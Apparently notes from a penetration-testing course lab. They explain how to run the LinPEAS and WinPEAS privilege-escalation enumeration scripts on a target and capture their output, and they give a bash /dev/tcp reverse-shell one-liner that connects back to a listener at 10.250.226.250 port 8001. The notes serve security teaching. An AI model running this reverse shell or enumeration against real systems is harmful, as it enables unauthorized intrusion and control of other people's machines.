

# Enumeration Scripts

Note:  Enumeration scripts for this lab are located in 
`~/cnm352-tools/scripts`

## Linux

### LinPEAS

To run the Linpeas enumeration script, first transfer the linpeas.sh file to the target and set the execute bits.

```bash
chmod +x linpeas.sh
```

Run the script one of two ways to capture output:

```bash
# Don't show output at the CLI, only capture to a file
./linpeas.sh > linpeas.txt

# Show output at CLI AND capture to file
./linpeas.sh | tee linpeas.txt
```

To view the output of the file in Kali with color coding:

```bash
less -r linpeas.txt
# Answer Y when asked if you want to continue opening
```

## Windows

### WinPEAS

Winpeas for Windows comes in multiple varieties.  The best one to use depends on the situation, but running each is straightforward:

```bash
# Batch file (for worst case scenarios)
winPEAS.bat > winpeas.txt

# 32-bit & compatible with 64-bit
winPEASx86.exe > winpeas.txt

# 64-bit only
winPEASx64.exe > winpeas.txt

# Viewing file from Windows CLI
type winpeas.txt
```

### Reverse Shell Without Netcat

You are not always guaranteed to have netcat on a target system.  You could always transfer the netcat binary.  However, it's also possible to initiate a reverse shell connection without netcat on the target.  

You will still need to start a netcat listener on Kali, but issuing this command on the target will cause the target to connect back in a reverse shell:

```bash
# Example 
# Connect to a netcat listener on 10.250.226.250 port 8001
bash &>/dev/tcp/10.250.226.250/8001 <&1
```

NOTE:  If echoing this command into a file, BE SURE to enclose it in single quotes or it will execute commands:

```bash
# Example
echo 'bash &>/dev/tcp/10.250.226.250/8001 <&1' > somefile.sh
```

